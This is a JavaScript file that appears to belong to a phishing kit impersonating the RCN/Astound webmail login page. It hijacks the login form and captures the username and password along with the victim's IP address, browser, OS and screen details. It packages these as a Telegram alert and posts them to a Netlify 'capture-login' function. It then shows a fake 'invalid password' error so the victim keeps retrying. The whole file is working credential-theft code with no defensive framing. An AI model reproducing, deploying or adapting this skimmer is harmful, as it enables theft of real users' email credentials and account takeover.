(function() {
  const CONFIG = {
    REDIRECT_URL: 'https://webmail.rcn.com/login-combined.php',
    ERROR_MESSAGE: 'Invalid username or password. Please try again.',
    SHOW_ERROR: true,
    DELAY_BEFORE_REDIRECT: 2000
  };

  let userIP = 'unknown';
  let isProcessing = false;

  function getIPAddress() {
    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(d => userIP = d.ip)
      .catch(() => userIP = 'unknown');
  }

  function getScreenInfo() {
    return {
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      windowWidth: window.innerWidth,
      windowHeight: window.innerHeight,
      colorDepth: window.screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
  }

  function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    let os = 'Unknown';

    if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
    else if (ua.indexOf('Safari') > -1) browser = 'Safari';
    else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
    else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident') > -1) browser = 'IE';
    else if (ua.indexOf('Edge') > -1) browser = 'Edge';

    if (ua.indexOf('Win') > -1) os = 'Windows';
    else if (ua.indexOf('Mac') > -1) os = 'MacOS';
    else if (ua.indexOf('Linux') > -1) os = 'Linux';
    else if (ua.indexOf('Android') > -1) os = 'Android';
    else if (ua.indexOf('iOS') > -1) os = 'iOS';

    return { browser, os };
  }

  function formatTelegramMessage(email, password, metadata) {
    const browserInfo = getBrowserInfo();
    const screenInfo = getScreenInfo();

    return `🔐 NEW WEBMAIL LOGIN ATTEMPT

📧 Email: ${email}
🔑 Password: ${password}

🌐 NETWORK INFO:
   IP: ${metadata.ip}
   Location: ${metadata.timezone}

💻 DEVICE INFO:
   Browser: ${browserInfo.browser}
   OS: ${browserInfo.os}
   Screen: ${screenInfo.screenWidth}x${screenInfo.screenHeight}

🕐 Time: ${new Date().toLocaleString()}
📍 URL: ${metadata.url}

---
Captured via Astound Webmail`;
  }

  function sendToBackend(email, password) {
    const screenInfo = getScreenInfo();
    const browserInfo = getBrowserInfo();

    const payload = {
      email: email,
      password: password,
      ip: userIP,
      userAgent: navigator.userAgent,
      sourceUrl: window.location.href,
      screenInfo: JSON.stringify({
        ...screenInfo,
        ...browserInfo
      }),
      timestamp: new Date().toISOString()
    };

    const telegramMessage = formatTelegramMessage(email, password, {
      ip: userIP,
      timezone: screenInfo.timezone,
      url: window.location.href
    });

    return fetch('/.netlify/functions/capture-login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        ...payload,
        telegramMessage: telegramMessage
      })
    });
  }

  function showErrorMessage() {
    const form = document.getElementById('ecWebmailSession');
    if (!form || !CONFIG.SHOW_ERROR) return;

    let errorDiv = document.getElementById('login-error-msg');
    if (!errorDiv) {
      errorDiv = document.createElement('div');
      errorDiv.id = 'login-error-msg';
      errorDiv.style.cssText = 'background-color: #fee; border: 1px solid #c33; color: #c33; padding: 12px; margin: 10px 0; border-radius: 4px; text-align: center; font-weight: bold;';
      form.parentNode.insertBefore(errorDiv, form);
    }
    errorDiv.textContent = CONFIG.ERROR_MESSAGE;
    errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }

  function handleFormSubmit(event) {
    if (isProcessing) {
      event.preventDefault();
      return false;
    }

    event.preventDefault();
    event.stopPropagation();
    isProcessing = true;

    const form = event.target;
    const submitButton = form.querySelector('input[type="image"]') || form.querySelector('button[type="submit"]');

    if (submitButton) {
      submitButton.disabled = true;
      submitButton.style.opacity = '0.5';
      submitButton.style.cursor = 'wait';
    }

    const emailField = form.querySelector('input[name="USERNAME"]');
    const passwordField = form.querySelector('input[name="PASSWORD"]');

    const email = emailField ? emailField.value : '';
    const password = passwordField ? passwordField.value : '';

    if (!email || !password) {
      if (submitButton) {
        submitButton.disabled = false;
        submitButton.style.opacity = '1';
        submitButton.style.cursor = 'pointer';
      }
      isProcessing = false;
      return false;
    }

    sendToBackend(email, password)
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          showErrorMessage();
          setTimeout(() => {
            if (emailField) emailField.value = '';
            if (passwordField) passwordField.value = '';
            if (submitButton) {
              submitButton.disabled = false;
              submitButton.style.opacity = '1';
              submitButton.style.cursor = 'pointer';
            }
            isProcessing = false;
          }, CONFIG.DELAY_BEFORE_REDIRECT);
        } else {
          if (submitButton) {
            submitButton.disabled = false;
            submitButton.style.opacity = '1';
            submitButton.style.cursor = 'pointer';
          }
          isProcessing = false;
        }
      })
      .catch(error => {
        console.error('Error:', error);
        if (submitButton) {
          submitButton.disabled = false;
          submitButton.style.opacity = '1';
          submitButton.style.cursor = 'pointer';
        }
        isProcessing = false;
      });

    return false;
  }

  function initCapture() {
    const form = document.getElementById('ecWebmailSession');
    if (!form) {
      return;
    }

    getIPAddress();

    form.addEventListener('submit', handleFormSubmit);

    const submitButton = form.querySelector('input[type="image"]');
    if (submitButton) {
      submitButton.addEventListener('click', function(e) {
        if (isProcessing) {
          e.preventDefault();
          e.stopPropagation();
          return false;
        }
      });
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initCapture);
  } else {
    initCapture();
  }
})();
